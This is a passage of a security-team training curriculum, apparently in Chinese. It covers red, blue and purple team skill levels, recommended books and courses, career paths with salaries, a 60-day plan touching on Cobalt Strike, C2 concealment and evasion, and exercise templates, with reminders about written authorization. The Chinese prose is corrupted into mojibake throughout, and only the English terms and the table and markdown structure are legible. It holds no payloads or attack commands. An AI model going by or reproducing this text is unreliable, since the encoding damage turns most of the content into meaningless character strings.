| èƒ½åŠ›ç»´åº¦ | ç­‰çº§1æè¿° | ç­‰çº§3æè¿° | ç­‰çº§5æè¿° | å½“å‰è¯„åˆ† | ç›®æ ‡è¯„åˆ† |
| --- | --- | --- | --- | --- | --- |
| çº¢é˜Ÿæ”»å‡» | ä»…ç†Ÿæ‚‰å¸¸è§„å·¥å…·ä½¿ç”¨ | èƒ½å¤Ÿå®šåˆ¶Payloadã€æ„å»ºæ”»å‡»é“¾ | å…·å¤‡APTæ¨¡æ‹Ÿèƒ½åŠ›ã€å¯å¼€å‘è‡ªç ”å·¥å…· |  |  |
| è“é˜Ÿæ£€æµ‹ | èƒ½åˆ†æå•æ¡å‘Šè­¦ | èƒ½è®¾è®¡æ£€æµ‹è§„åˆ™ä¸ä»ªè¡¨æ¿ | æ„å»ºè‡ªåŠ¨åŒ–æ£€æµ‹å¹³å°å¹¶æŒç»­ä¼˜åŒ– |  |  |
| ç´«é˜ŸååŒ | è¢«åŠ¨å‚ä¸å¤ç›˜ | èƒ½ä¸»æŒå°å‹éªŒè¯æ´»åŠ¨ | æ¨åŠ¨æ”»é˜²å¸¸æ€åŒ–ã€æŒ‡æ ‡ä½“ç³»åŒ– |  |  |
| æµç¨‹æ²»ç† | äº†è§£åŸºæœ¬æµç¨‹ | èƒ½ç¼–å†™æ¼”ç»ƒSOPã€æŠ¥å‘Š | è®¾è®¡å…¨å±€æ²»ç†ä½“ç³»ã€æŒ‡æ ‡é—­ç¯ |  |  |
| æ²Ÿé€šå½±å“ | å†…éƒ¨åˆ†äº« | ç»„ç»‡è·¨éƒ¨é—¨åŸ¹è®­ | å¯¹å¤–æ¼”è®²ã€è¡Œä¸šå½±å“åŠ› |  |  |

### èƒ½åŠ›æ¡£æ¡ˆå¤¹ï¼ˆPortfolioï¼‰å»ºè®®
- **é¡¹ç›®æ–‡æ¡£**ï¼šæˆæƒä¹¦ã€è®¡åˆ’ä¹¦ã€æ—¥æŠ¥ã€å¤ç›˜æŠ¥å‘Šã€‚
- **æŠ€æœ¯æˆæœ**ï¼šè„šæœ¬ã€æ£€æµ‹è§„åˆ™ã€è‡ªåŠ¨åŒ–å‰§æœ¬ã€å·¥å…·è¯´æ˜ã€‚
- **æ¼”è®²è¾“å‡º**ï¼šPPTã€è§†é¢‘ã€åšå®¢ã€æ’­å®¢ã€ç¤¾åŒºå¸–å­ã€‚
- **æŒ‡æ ‡è¯æ®**ï¼šMTTD/MTTRæ”¹è¿›å‰åå¯¹æ¯”ã€æ£€æµ‹è¦†ç›–ç‡å›¾è¡¨ã€‚
- **è£èª‰è®¤è¯**ï¼šè¯ä¹¦ã€ç«èµ›æˆç»©ã€å®¢æˆ·æ¨èã€å†…éƒ¨è¡¨å½°ã€‚

### å­¦ä¹ èŠ‚å¥ä¸å¤ç›˜æœºåˆ¶
- **å­£åº¦å¤ç›˜**ï¼š
  1. æ±‡æ€»æ¼”ç»ƒæ¬¡æ•°ã€æˆåŠŸç‡ã€é£é™©é—­ç¯ã€‚
  2. æ›´æ–°èƒ½åŠ›é›·è¾¾å›¾ï¼Œåˆ¶å®šä¸‹å­£åº¦OKRã€‚
  3. è¯„ä¼°å·¥å…·åº“æ›´æ–°æƒ…å†µã€è‡ªåŠ¨åŒ–è¦†ç›–ç‡ã€‚
- **æœˆåº¦å†²åˆº**ï¼š
  - è®¾ç½®ä¸»é¢˜ï¼ˆå¦‚â€œäº‘æ”»é˜²æœˆâ€â€œAPTæ¨¡æ‹Ÿæœˆâ€ï¼‰ã€‚
  - æ¯å‘¨è¾“å‡ºè‡³å°‘ä¸€ç¯‡å¤ç›˜æˆ–æŠ€æœ¯æ–‡ç« ã€‚
  - ç»„ç»‡ä¸€æ¬¡çº¢è“çŸ¥è¯†åˆ†äº«ä¼šã€‚
- **æ¯æ—¥ä¾‹è¡Œ**ï¼š
  - Morning Briefï¼šå…³æ³¨æœ€æ–°CVEã€å¨èƒæƒ…æŠ¥ã€‚
  - Evening Wrapï¼šè®°å½•å½“æ—¥äº®ç‚¹ä¸é—®é¢˜ã€‚

### å­¦ä¹ ç¤¾ç¾¤è¿è¥å»ºè®®
- å»ºç«‹å†…éƒ¨Wikiæˆ–Notionâ€œæ”»é˜²çŸ¥è¯†åº“â€ã€‚
- æ¯å‘¨å¼€å±•ä¸€æ¬¡Lightning Talkï¼ˆ10åˆ†é’Ÿå¿«é€Ÿåˆ†äº«ï¼‰ã€‚
- å¯åŠ¨â€œå¸ˆå¾’åˆ¶â€ï¼šåˆçº§å·¥ç¨‹å¸ˆé…å¯¹èµ„æ·±å¯¼å¸ˆã€‚
- è®¾ç«‹â€œæ”»é˜²ä¹‹æ˜Ÿâ€å¥–é¡¹ï¼Œè¡¨å½°ä¼˜ç§€è´¡çŒ®ã€‚
- ä¸å¤–éƒ¨ç¤¾åŒºè”åŠ¨ï¼šOWASPã€æœ¬åœ°å®‰å…¨æ²™é¾™ã€SRC Meetupã€‚

---

---

## æ¨¡å—å…«ï¼šèµ„æºæ‹“å±•ä¸è¡Œä¸šæ´å¯Ÿ

### æ¨¡å—æ€»è§ˆï¼ˆèµ„æºè§†è§’ï¼‰
- **ç›®çš„**ï¼šæ„å»ºå¤šå±‚æ¬¡å­¦ä¹ ä¸æƒ…æŠ¥è·å–æ¸ é“ï¼Œç¡®ä¿æŠ€æœ¯ã€æµç¨‹ã€è¡Œä¸šè¶‹åŠ¿åŒæ­¥æ›´æ–°ã€‚
- **ç»“æ„**ï¼šä¹¦ç± â†’ è¯¾ç¨‹ â†’ å¹³å° â†’ ç¤¾åŒº â†’ æƒ…æŠ¥ â†’ èµ›äº‹ â†’ è®ºå›ã€‚
- **ç­–ç•¥**ï¼šæ ¸å¿ƒèµ„æºï¼ˆå¿…ä¿®ï¼‰ã€æ‹“å±•èµ„æºï¼ˆé€‰ä¿®ï¼‰ã€å®æˆ˜èµ„æºï¼ˆç»ƒä¹ ï¼‰ã€æ´å¯Ÿèµ„æºï¼ˆè¶‹åŠ¿ï¼‰ã€‚

### ğŸ“š æ¨èä¹¦ç±
1. **ã€ŠRed Team: How to Succeed By Thinking Like the Enemyã€‹** - çº¢é˜Ÿæ€ç»´
2. **ã€ŠBlue Team Handbookã€‹** - è“é˜Ÿå®æˆ˜æ‰‹å†Œ
3. **ã€ŠApplied Incident Responseã€‹** - åº”æ€¥å“åº”å®è·µ
4. **ã€ŠThe Art of Network Penetration Testingã€‹** - ç½‘ç»œæ¸—é€è‰ºæœ¯

### ğŸ“ åœ¨çº¿è¯¾ç¨‹
- SANS SEC564: Red Team Operations
- SANS SEC555: SIEM Implementation
- Offensive Security: OSCP/OSEP
- eLearnSecurity: eCIR (æ•°å­—å–è¯)

### ğŸ”§ å®æˆ˜å¹³å°
- **RangeForce**: è“é˜ŸåŸ¹è®­å¹³å°
- **Immersive Labs**: çº¢è“å¯¹æŠ—è®­ç»ƒ
- **Cyber Defenders**: è“é˜ŸæŒ‘æˆ˜
- **Attack Defense**: åœ¨çº¿å¯¹æŠ—å¹³å°

### ğŸ“° å®‰å…¨èµ„è®¯
- **MITRE ATT&CK**: æˆ˜æœ¯çŸ¥è¯†åº“
- **SpecterOps Blog**: çº¢é˜Ÿç ”ç©¶
- **Red Canary Blog**: å¨èƒæ£€æµ‹
- **DFIR Report**: äº‹ä»¶å“åº”æŠ¥å‘Š

### âš”ï¸ æ¨èèµ›äº‹ä¸æ¼”ç»ƒå¹³å°
| èµ›äº‹/å¹³å° | ç±»å‹ | å‘¨æœŸ | è¯´æ˜ |
| --- | --- | --- | --- |
| å›½å®¶çº§æŠ¤ç½‘ | å¤§å‹å®æˆ˜æ¼”ç»ƒ | æ¯å¹´ | å…³æ³¨å…³é”®ä¿¡æ¯åŸºç¡€è®¾æ–½æ”»é˜²ï¼Œå¯¹æµç¨‹å’ŒååŒè¦æ±‚é«˜ |
| XCTFè”èµ› | æ”»é˜²å…¼å¤‡ | æ¯å¹´ | æ¶µç›–Webã€Pwnã€é€†å‘ã€å–è¯ç­‰å¤šé¢†åŸŸ |
| çº¢å¸½æ¯ | ä¼ä¸šæ”»é˜²æ¼”ç»ƒ | æ¯å¹´ | ä¸çœŸå®ä¼ä¸šç¯å¢ƒç»“åˆï¼Œé€‚åˆçº¢è“ååŒ |
| BlueHat/BlackHat Trainings | å›½é™…å®‰å…¨å¤§ä¼š | æ¯å¹´ | è·å–æœ€æ–°æ”»é˜²æŠ€æœ¯ï¼Œæ‹“å±•è§†é‡ |
| ICS CTF | å·¥æ§å®‰å…¨ | æ¯å¹´ | èšç„¦OT/ICSåœºæ™¯çš„æ”»é˜²æŒ‘æˆ˜ |

### ğŸ—ï¸ ä¿¡æ¯è·å–ç­–ç•¥
- **æ¯æ—¥**ï¼šRSSè®¢é˜…ï¼ˆSecurityWeekã€BleepingComputerã€FreeBufï¼‰ã€Twitter/Xå®‰å…¨è´¦å·ã€Telegramæƒ…æŠ¥é¢‘é“ã€‚
- **æ¯å‘¨**ï¼šé˜…è¯»DFIR Reportã€Mandiantåšå®¢ã€å¥‡å®‰ä¿¡/è…¾è®¯ç§‘æ©æ”»é˜²ç ”ç©¶ã€Azure/AWSå®‰å…¨å…¬å‘Šã€‚
- **æ¯æœˆ**ï¼šæ•´ç†ä¸€ä»½æƒ…æŠ¥æ‘˜è¦ï¼ˆTopæ¼æ´ã€Topæ”»å‡»æ¡ˆä¾‹ã€æ£€æµ‹å»ºè®®ï¼‰å‘é€ç»™å›¢é˜Ÿã€‚
- **äº‹ä»¶é©±åŠ¨**ï¼šå½“å‡ºç°é‡å¤§CVEï¼ˆå¦‚Exchange ProxyLogonã€Log4Shellï¼‰ï¼Œç«‹å³ç»„ç»‡æ¡Œé¢æ¼”ç»ƒã€‚

### ğŸ§­ è¡Œä¸šè¶‹åŠ¿è§‚å¯Ÿ
- **äº‘åŸç”Ÿå®‰å…¨**ï¼šå…³æ³¨ä¾›åº”é“¾ã€å®¹å™¨é€ƒé€¸ã€Kubernetes RBACæ»¥ç”¨ï¼›å»ºè®®è·Ÿè¿›KubeConã€CloudNativeSecurityã€‚
- **AIè¾…åŠ©æ”»é˜²**ï¼šç ”ç©¶AIç”Ÿæˆé’“é±¼å†…å®¹ã€è‡ªåŠ¨ç¼–ç å·¥å…·ï¼ŒåŒæ—¶å…³æ³¨AIæ¨¡å‹å®‰å…¨ï¼ˆæç¤ºæ³¨å…¥ã€æ¨¡å‹çªƒå–ï¼‰ã€‚
- **é›¶ä¿¡ä»»å®è·µ**ï¼šè·Ÿè¸ªNIST 800-207ã€é«˜å¯ä¿¡èº«ä»½è®¤è¯ã€å¾®éš”ç¦»æ–¹æ¡ˆçš„æ”»é˜²å¯¹æŠ—å˜åŒ–ã€‚
- **åˆè§„é©±åŠ¨**ï¼šCSCCã€Šç½‘ç»œå®‰å…¨æ¼æ´æŠ¥å‘Šè¦æ±‚ã€‹ã€ç­‰ä¿2.0å‡çº§ã€å®‰å…¨è¿è¥ä¸æ”»é˜²æ¼”ç»ƒçº³å…¥ç›‘ç®¡è€ƒæ ¸ã€‚
- **è¡Œä¸šæ¡ˆä¾‹åº“**ï¼šå»ºè®®æ”¶é›†é‡‘èã€åˆ¶é€ ã€èƒ½æºã€åŒ»ç–—ç­‰å…¸å‹è¡Œä¸šæ”»é˜²æ¡ˆä¾‹ï¼Œå½¢æˆè¡Œä¸šä¸“é¢˜åº“ã€‚

---

---

## æ¨¡å—ä¹ï¼šèŒä¸šå‘å±•ä¸æˆé•¿è·¯å¾„

### æ¨¡å—æ€»è§ˆï¼ˆèŒä¸šè§†è§’ï¼‰
- **ç›®æ ‡**ï¼šå¸®åŠ©å­¦ä¹ è€…è§„åˆ’çº¢é˜Ÿã€è“é˜Ÿã€ç´«é˜Ÿä¹ƒè‡³å®‰å…¨æ¶æ„å²—ä½çš„èŒä¸šå‘å±•è·¯å¾„ï¼Œæ˜ç¡®æŠ€èƒ½æ ˆã€è¯ä¹¦ã€é¡¹ç›®ç»éªŒã€è½¯æŠ€èƒ½ä¸å½±å“åŠ›å»ºè®¾ã€‚
- **æ–¹æ³•**ï¼šåˆ†å±‚çº§è¯„ä¼° + èƒ½åŠ›çŸ©é˜µ + ä½œå“é›† + äº§ä¸šåœˆå±‚ã€‚
- **å…³é”®æ­¥éª¤**ï¼šå®šä½ â†’ ç§¯ç´¯ â†’ è®¤è¯ â†’ è¾“å‡º â†’ é¢†å¯¼åŠ›ã€‚

### çº¢é˜Ÿå·¥ç¨‹å¸ˆ
**åˆçº§ï¼ˆ0-2å¹´ï¼‰**:
- æŒæ¡åŸºç¡€æ¸—é€æŠ€æœ¯
- ç†Ÿç»ƒä½¿ç”¨ä¸»æµå·¥å…·
- å‚ä¸çº¢é˜Ÿé¡¹ç›®
- å¹´è–ªï¼š20-35ä¸‡

**ä¸­çº§ï¼ˆ2-5å¹´ï¼‰**:
- ç‹¬ç«‹å®Œæˆçº¢é˜Ÿé¡¹ç›®
- å¼€å‘è‡ªå®šä¹‰å·¥å…·
- APTæ”»å‡»æ¨¡æ‹Ÿ
- å¹´è–ªï¼š35-60ä¸‡

**é«˜çº§ï¼ˆ5å¹´ä»¥ä¸Šï¼‰**:
- çº¢é˜Ÿè´Ÿè´£äºº
- 0dayç ”ç©¶
- åŸ¹è®­å›¢é˜Ÿ
- å¹´è–ªï¼š60-100ä¸‡+

### è“é˜Ÿå·¥ç¨‹å¸ˆ
**åˆçº§ï¼ˆ0-2å¹´ï¼‰**:
- SOCåˆ†æå¸ˆ
- å‘Šè­¦åˆ†ç±»å¤„ç†
- åŸºç¡€åº”æ€¥å“åº”
- å¹´è–ªï¼š15-30ä¸‡

**ä¸­çº§ï¼ˆ2-5å¹´ï¼‰**:
- å¨èƒç‹©çŒåˆ†æå¸ˆ
- æ£€æµ‹è§„åˆ™å¼€å‘
- äº‹ä»¶å“åº”ä¸“å®¶
- å¹´è–ªï¼š30-50ä¸‡

**é«˜çº§ï¼ˆ5å¹´ä»¥ä¸Šï¼‰**:
- SOCæ¶æ„å¸ˆ
- å¨èƒæƒ…æŠ¥ä¸“å®¶
- åº”æ€¥å“åº”è´Ÿè´£äºº
- å¹´è–ªï¼š50-80ä¸‡+

### è·¨è§’è‰²æˆé•¿è·¯å¾„
| å¹´é™ | çº¢é˜Ÿå‘å±• | è“é˜Ÿå‘å±• | ç´«é˜Ÿ/å®‰å…¨æ¶æ„å‘å±• | å»ºè®®è¯ä¹¦ | å…³é”®æˆæœ |
| --- | --- | --- | --- | --- | --- |
| 0-1å¹´ | å®ŒæˆåŸºç¡€æ¸—é€è¯¾ç¨‹ï¼Œå‚ä¸CTF | ç†Ÿæ‚‰SIEMã€æ—¥å¿—åˆ†æ | ååŠ©é›†æˆå·¥å…·ã€å­¦ä¹ æµç¨‹ | eJPTã€CCSK | å®Œæˆ3æ¬¡é¶æœºæ¼”ç»ƒã€1æ¬¡æ£€æµ‹è§„åˆ™ä¸Šçº¿ |
| 1-3å¹´ | ä¸»å¯¼å°å‹çº¢é˜Ÿé¡¹ç›®ï¼Œç¼–å†™è„šæœ¬ | è®¾è®¡æ£€æµ‹è§„åˆ™ã€å“åº”æ‰‹å†Œ | ä¸»æŒ1-2ä¸ªç´«é˜Ÿåœºæ™¯ã€æ¨åŠ¨æŒ‡æ ‡ | OSCPã€GCIA | è¾“å‡º10ç¯‡å¤ç›˜ã€2ä¸ªè‡ªåŠ¨åŒ–è„šæœ¬ |
| 3-5å¹´ | æ„å»ºæ”»å‡»é“¾ã€å¼€å‘è‡ªç ”å·¥å…· | ç»Ÿç­¹SOCã€å¼€å±•å¨èƒç‹©çŒ | è´Ÿè´£æ”»é˜²è®¡åˆ’ã€æŒ‡æ ‡ç®¡ç† | OSEPã€GCTI | å®Œæˆå¤§å‹æ¼”ç»ƒã€å»ºç«‹çŸ¥è¯†åº“ |
| 5å¹´ä»¥ä¸Š | æ„å»ºçº¢é˜Ÿä½“ç³»ã€0dayç ”ç©¶ | æ„å»ºå®‰å…¨è¿è¥ä½“ç³»ã€å¼•å…¥SOAR | è®¾è®¡å®‰å…¨æ¶æ„ã€æ¨åŠ¨å®‰å…¨æ²»ç† | OSCE3ã€GSE | ä¸»å¯¼è¡Œä¸šçº§æ¼”ç»ƒã€å‘è¡¨ç ”ç©¶æŠ¥å‘Š |

### å½±å“åŠ›å»ºè®¾æŒ‡å—
1. **å†…éƒ¨å½±å“åŠ›**ï¼šå®šæœŸåˆ†äº«æŠ€æœ¯æˆæœã€ç»„ç»‡æ”»é˜²æ¼”ç»ƒåŸ¹è®­ã€ç¼–å†™å·¥å…·æ–‡æ¡£ã€‚
2. **è¡Œä¸šå½±å“åŠ›**ï¼šæŠ•ç¨¿å®‰å…¨å³°ä¼šã€å¼€æºå·¥å…·ã€æ’°å†™ç™½çš®ä¹¦ã€å‚ä¸æ ‡å‡†åˆ¶å®šã€‚
3. **å•†ä¸šä»·å€¼**ï¼šå¸®åŠ©ä¼ä¸šæ­å»ºå®‰å…¨äº§å“åŸå‹ã€è¯„ä¼°å®‰å…¨æŠ•èµ„ROIã€å¯¹æ¥å®¢æˆ·éœ€æ±‚ã€‚
4. **ä¸ªäººå“ç‰Œ**ï¼šç»´æŠ¤æŠ€æœ¯åšå®¢ã€è¿è¥ç¤¾äº¤åª’ä½“ã€å‚åŠ æ’­å®¢/ç›´æ’­ã€‚

### é¢è¯•ä¸æ™‹å‡å‡†å¤‡
- **çº¢é˜Ÿ**ï¼šå±•ç¤ºå®Œæ•´æ”»å‡»é“¾æ¡ˆä¾‹ã€ä»£ç è¯„å®¡ã€æŠ—æ£€æµ‹ç­–ç•¥ã€ä½œæˆ˜æ‰‹å†Œã€‚
- **è“é˜Ÿ**ï¼šå‘ˆç°æ£€æµ‹è§„åˆ™åº“ã€å‘Šè­¦é™å™ªã€å…¸å‹äº‹ä»¶å“åº”æµç¨‹ã€SOARå‰§æœ¬ã€‚
- **ç´«é˜Ÿ/æ¶æ„**ï¼šæ¼”ç¤ºæŒ‡æ ‡çœ‹æ¿ã€æ”»é˜²ååŒæµç¨‹ã€ç»„ç»‡æ²»ç†æ¡ˆä¾‹ã€è·¨éƒ¨é—¨æ²Ÿé€šèƒ½åŠ›ã€‚
- **é€šç”¨**ï¼šSTARæ³•åˆ™æè¿°é—®é¢˜ä¸æˆæ•ˆï¼Œå‡†å¤‡é‡åŒ–æŒ‡æ ‡ï¼ˆMTTD/MTTRã€è¦†ç›–ç‡ã€èŠ‚çº¦æˆæœ¬ï¼‰ã€‚

---

---

## æ¨¡å—åï¼š60å¤©å¼ºåŒ–è®­ç»ƒè®¡åˆ’

### æ¨¡å—æ€»è§ˆï¼ˆè®­ç»ƒè§†è§’ï¼‰
- **è®¾è®¡åŸåˆ™**ï¼šä»¥å®æˆ˜ä¸ºä¸­å¿ƒï¼Œå°†çº¢é˜Ÿã€è“é˜Ÿã€ç´«é˜ŸæŠ€èƒ½äº¤æ›¿è®­ç»ƒï¼Œå¼ºè°ƒæˆæœå¯éªŒè¯ä¸é¡¹ç›®åŒ–è¾“å‡ºã€‚
- **è·¯å¾„ç»“æ„**ï¼šåŸºç¡€ â†’ è¿›é˜¶ â†’ è“é˜Ÿ â†’ å¤ç›˜ â†’ ç»¼åˆ â†’ ä½œå“é›†ã€‚
- **é…å¥—å·¥å…·**ï¼šå­¦ä¹ å‘¨æŠ¥æ¨¡æ¿ã€OKRçœ‹æ¿ã€æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ã€ç»ƒä¹ é¢˜åº“ã€‚

### ç¬¬1-2å‘¨ï¼šçº¢é˜ŸåŸºç¡€
**Day 1-7**:
- MITRE ATT&CKæ¡†æ¶å­¦ä¹ 
- Cobalt StrikeåŸºç¡€æ“ä½œ
- é’“é±¼æ”»å‡»æŠ€æœ¯

**Day 8-14**:
- PowerShellæ”»å‡»æŠ€æœ¯
- æƒé™æå‡å®æˆ˜
- æ¨ªå‘ç§»åŠ¨ç»ƒä¹ 

### ç¬¬3-4å‘¨ï¼šçº¢é˜Ÿè¿›é˜¶
**Day 15-21**:
- C2é€šä¿¡éšè”½åŒ–
- é˜²å¾¡è§„é¿æŠ€æœ¯
- è‡ªå®šä¹‰å·¥å…·å¼€å‘

**Day 22-28**:
- å®Œæˆ5å°å†…ç½‘é¶æœº
- æ¨¡æ‹ŸAPTæ”»å‡»é“¾
- çº¢é˜ŸæŠ¥å‘Šç¼–å†™

### ç¬¬5-6å‘¨ï¼šè“é˜ŸåŸºç¡€
**Day 29-35**:
- SIEMç³»ç»Ÿéƒ¨ç½²
- æ—¥å¿—åˆ†ææŠ€æœ¯
- æ£€æµ‹è§„åˆ™ç¼–å†™

**Day 36-42**:
- å¨èƒç‹©çŒå®è·µ
- åº”æ€¥å“åº”æ¼”ç»ƒ
- å–è¯åˆ†æåŸºç¡€

### ç¬¬7-8å‘¨ï¼šè“é˜Ÿè¿›é˜¶
**Day 43-49**:
- é«˜çº§å¨èƒæ£€æµ‹
- å†…å­˜å–è¯åˆ†æ
- æ¶æ„è½¯ä»¶åˆ†æ

**Day 50-56**:
- å®Œæ•´äº‹ä»¶å“åº”
- SOCæµç¨‹ä¼˜åŒ–
- è“é˜ŸæŠ¥å‘Šç¼–å†™

### ç¬¬9-10å‘¨ï¼šç»¼åˆå®æˆ˜
**Day 57-60**:
- çº¢è“å¯¹æŠ—æ¼”ç»ƒ
- ç´«é˜ŸååŒä¼˜åŒ–
- æ€»ç»“ä¸å¤ç›˜

---

### å­¦ä¹ å‘¨æŠ¥æ¨¡æ¿
```markdown
## å‘¨æŠ¥å‘¨æœŸï¼š2024-W15

### æœ¬å‘¨ç›®æ ‡è¾¾æˆæƒ…å†µ
- [x] å®Œæˆ3ä¸ªAtomic Red Teamåœºæ™¯å¤ç°
- [x] æ–°å¢2æ¡Sigmaè§„åˆ™å¹¶éªŒè¯
- [ ] å®ŒæˆCloudGoatåœºæ™¯ï¼ˆå»¶æœŸï¼šç¼ºå°‘AWSè´¦å·ï¼‰

### å…³é”®æˆæœä¸äº§å‡º
- Red Teamï¼šå®Œæˆé’“é±¼â†’å†…ç½‘â†’æ•°æ®æ¸—å‡ºçš„å®Œæ•´é“¾è·¯å¤ç›˜æ–‡æ¡£
- Blue Teamï¼šä¸Šçº¿`PS_EncodedCommand`æ£€æµ‹è§„åˆ™ï¼Œè¯¯æŠ¥ç‡ä¸‹é™30%
- Purple Teamï¼šæ›´æ–°è”åŠ¨çœ‹æ¿ï¼Œæ–°å¢4ä¸ªè¡ŒåŠ¨é¡¹

### é—®é¢˜ä¸é˜»å¡
- ç¼ºå°‘ç”Ÿäº§ç¯å¢ƒæµé‡æ ·æœ¬ï¼Œè®¡åˆ’ä¸ç½‘ç»œå›¢é˜Ÿåè°ƒ
- EDRç­–ç•¥æ›´æ–°å®¡æ‰¹æµç¨‹è¾ƒé•¿ï¼Œå»ºè®®ä¸å®‰å…¨ç­–ç•¥å›¢é˜ŸåŒæ­¥ä¼˜åŒ–

### ä¸‹å‘¨è®¡åˆ’
- å®ŒæˆCloudGoatåœºæ™¯å¹¶è¾“å‡ºå¤ç›˜
- ç¼–å†™SOARå‰§æœ¬ï¼šéš”ç¦»å¯ç–‘ä¸»æœº + è·å–å†…å­˜é•œåƒ
- å‚åŠ å†…éƒ¨åˆ†äº«ã€Šæ¼”ç»ƒæŒ‡æ ‡è®¾è®¡å®æˆ˜ã€‹

### éœ€è¦çš„æ”¯æŒ
- ç”³è¯·æµ‹è¯•ç½‘æ®µå¼€æ”¾Outboundç«¯å£ 80/443/8080
- å®‰æ’ä¸€æ¬¡ä¸ä¸šåŠ¡è´Ÿè´£äººäº¤æµä¼šè®®ï¼ˆæ¼”ç»ƒå½±å“è¯„ä¼°ï¼‰
```

### æ—¶é—´æŠ•å…¥è¿½è¸ªè¡¨ï¼ˆç¤ºä¾‹ï¼‰
| æ—¥æœŸ | æ¨¡å— | æ´»åŠ¨ | æ—¶é•¿(h) | å¤‡æ³¨ |
| --- | --- | --- | --- | --- |
| 2024-04-01 | çº¢é˜Ÿ | ATT&CK Reconç»ƒä¹  | 2.5 | å®Œæˆ3ä¸ªå­åŸŸåœºæ™¯ |
| 2024-04-02 | çº¢é˜Ÿ | C2ç¯å¢ƒéƒ¨ç½² | 3 | Ansibleè‡ªåŠ¨åŒ–æˆåŠŸ |
| 2024-04-03 | è“é˜Ÿ | SIEMè§„åˆ™è°ƒè¯• | 2 | å‘½ä¸­ç‡æå‡ |
| 2024-04-04 | è“é˜Ÿ | Threat Hunting | 2.5 | å‘ç°å¼‚å¸¸RDPè¡Œä¸º |
| 2024-04-05 | ç´«é˜Ÿ | è”åŠ¨ä¼šè®®ä¸å¤ç›˜ | 1.5 | å½¢æˆ5ä¸ªè¡ŒåŠ¨é¡¹ |

> å»ºè®®ä½¿ç”¨Notion/Obsidian/Excelç»´æŠ¤å­¦ä¹ è½¨è¿¹ï¼Œå½¢æˆå¯å¤ç”¨æ¡ˆä¾‹åº“ã€‚

---

## âš ï¸ å®‰å…¨æé†’

1. **åˆæ³•æˆæƒ**: æ‰€æœ‰æ´»åŠ¨å¿…é¡»è·å¾—ä¹¦é¢æˆæƒ
2. **ä¿å¯†ä¹‰åŠ¡**: ä¸¥æ ¼ä¿æŠ¤æ¼”ç»ƒä¿¡æ¯å’Œå‘ç°
3. **æœ€å°å½±å“**: é¿å…å½±å“ä¸šåŠ¡æ­£å¸¸è¿è¡Œ
4. **åŠæ—¶æ²Ÿé€š**: å‘ç°é‡å¤§é—®é¢˜ç«‹å³æŠ¥å‘Š
5. **æŒç»­å­¦ä¹ **: æ”»é˜²æŠ€æœ¯ä¸æ–­æ¼”è¿›

---

## é™„å½•Aï¼šæ¼”ç»ƒæ ¸å¿ƒæ–‡æ¡£æ¨¡æ¿

### A.1 æˆæƒä¸æ²Ÿé€šæ¨¡æ¿
```markdown
# çº¢è“å¯¹æŠ—æˆæƒä¹¦
- é¡¹ç›®åç§°ï¼š<å¡«å†™>
- æ¼”ç»ƒæ—¶é—´ï¼š<å¼€å§‹æ—¥æœŸ> è‡³ <ç»“æŸæ—¥æœŸ>
- æ¼”ç»ƒèŒƒå›´ï¼š<ç³»ç»Ÿ/ç½‘æ®µ/èµ„äº§åˆ—è¡¨>
- æ’é™¤èŒƒå›´ï¼š<ç¦æ­¢æ”»å‡»çš„ç³»ç»Ÿæˆ–ä¸šåŠ¡>
- è´£ä»»åˆ†å·¥ï¼šçº¢é˜Ÿ/è“é˜Ÿ/ç™½é˜Ÿ/ç´«é˜Ÿè”ç³»äººã€ç”µè¯ã€å€¼ç­æ—¶é—´
- å®‰å…¨é™åˆ¶ï¼šç¦æ­¢DoSã€ç¦æ­¢åˆ é™¤æ•°æ®ã€ç¦æ­¢å½±å“ç”Ÿäº§ã€è§¦å‘L2/L3é¡»æš‚åœ
- è¯æ®è¦æ±‚ï¼šçº¢é˜Ÿé¡»ä¿ç•™å‘½ä»¤ã€æ—¥å¿—ï¼›è“é˜Ÿé¡»ä¿ç•™å‘Šè­¦ã€å“åº”è®°å½•ï¼›ç™½é˜Ÿç»Ÿä¸€å½’æ¡£
- æ³•åŠ¡æ¡æ¬¾ï¼šä¿å¯†åè®®ã€è´£ä»»èŒƒå›´ã€æ•°æ®å¤„ç†è¦æ±‚ã€å›æ»šè´£ä»»
- ç­¾ç½²ï¼šç”²æ–¹/ä¹™æ–¹/è§è¯äºº
```

### A.2 æ¼”ç»ƒè®¡åˆ’æ¨¡æ¿
```markdown
# æ¼”ç»ƒè®¡åˆ’ä¹¦
1. ç›®æ ‡ä¸æˆåŠŸæ ‡å‡†
2. æ¼”ç»ƒèŒƒå›´ä¸æ’é™¤é¡¹
3. å…³é”®èµ„äº§ä¼˜å…ˆçº§åˆ—è¡¨
4. æ—¶é—´çº¿ä¸é‡Œç¨‹ç¢‘ï¼ˆå«æ¯æ—¥ä¾‹ä¼šå®‰æ’ï¼‰
5. äººå‘˜ä¸èŒè´£ï¼ˆRACIçŸ©é˜µï¼‰
6. å·¥å…·ä¸ç¯å¢ƒå‡†å¤‡ï¼ˆC2ã€SIEMã€SOARã€é¶åœºï¼‰
7. æ²Ÿé€šä¸å‡çº§æµç¨‹
8. é£é™©è¯„ä¼°ä¸ä¸­æ­¢æ¡ä»¶
9. è¯æ®ä¸æ—¥å¿—ç®¡ç†ç­–ç•¥
10. æ¼”ç»ƒæŒ‡æ ‡ï¼ˆæ£€æµ‹ã€å“åº”ã€æ”¹è¿›ï¼‰
```

### A.3 æ—¥æŠ¥æ¨¡æ¿
```markdown
# çº¢è“å¯¹æŠ—æ—¥æŠ¥ - <æ—¥æœŸ>
## 1. çº¢é˜Ÿè¡ŒåŠ¨æ‘˜è¦
- ä¾¦å¯Ÿï¼š<æè¿°>
- åˆ©ç”¨ï¼š<æè¿°>
- æ¨ªå‘ï¼š<æè¿°>
- æ•°æ®è®¿é—®ï¼š<æè¿°>

## 2. è“é˜Ÿæ£€æµ‹ä¸å“åº”
- å‘Šè­¦æ•°é‡ï¼š<æ€»æ•°>ï¼ˆé«˜/ä¸­/ä½ï¼‰
- å…³é”®æ£€æµ‹ï¼š<è§„åˆ™åç§°/æ—¶é—´/å¤„ç†äºº>
- å“åº”æªæ–½ï¼š<éš”ç¦»/é˜»æ–­/å–è¯>

## 3. é£é™©è¯„ä¼°
- å½±å“èµ„äº§ï¼š<åˆ—è¡¨>
- å½±å“ç­‰çº§ï¼š<L0/L1/L2/L3>
- æ˜¯å¦è§¦å‘å‡çº§ï¼š<æ˜¯/å¦>

## 4. é—®é¢˜ä¸è¡ŒåŠ¨é¡¹
- é—®é¢˜ï¼š<æè¿° / è´£ä»»äºº / æˆªæ­¢æ—¶é—´>
